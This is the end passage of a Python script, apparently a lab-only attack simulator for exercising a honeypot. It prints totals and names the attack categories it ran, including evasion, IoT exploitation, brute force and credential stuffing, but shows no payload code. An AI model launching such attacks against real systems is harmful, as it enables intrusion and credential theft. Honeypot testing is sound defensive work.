        password_attack_count = 0

    print("=" * 60)
    # Updated total count including password attacks
    original_attacks = 200 + 150 + 120 + 100 + 80 + 150 + 200 + 60 + 200 + 50 + 20 + 200 + 120 + 80  # Updated malware count
    new_attacks = 100 + 150 + 100  # Evasion, API, IoT
    password_attacks = password_attack_count
    total_attacks = original_attacks + new_attacks + password_attacks
    print(f"[*] ULTIMATE simulation complete! Total attacks launched: {total_attacks}+")
    print("[*] Attack categories included:")
    print("    - Advanced evasion techniques")
    print("    - API-specific attacks")
    print("    - IoT device exploitation")
    print("    - Sophisticated password cracking")
    print("    - Multi-service brute force")
    print("    - Credential stuffing attacks")
    print("[*] Check honeypot logs for captured events.")
    print("[*] Run: python -m honeypot.services.analyzer")
    print("=" * 60)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Safe honeypot attack simulator (lab-only).")
    parser.add_argument("--target", "-t", default=DEFAULT_TARGET, help="Target hostname/IP (must be private/local).")
    args = parser.parse_args()
    main(args.target)
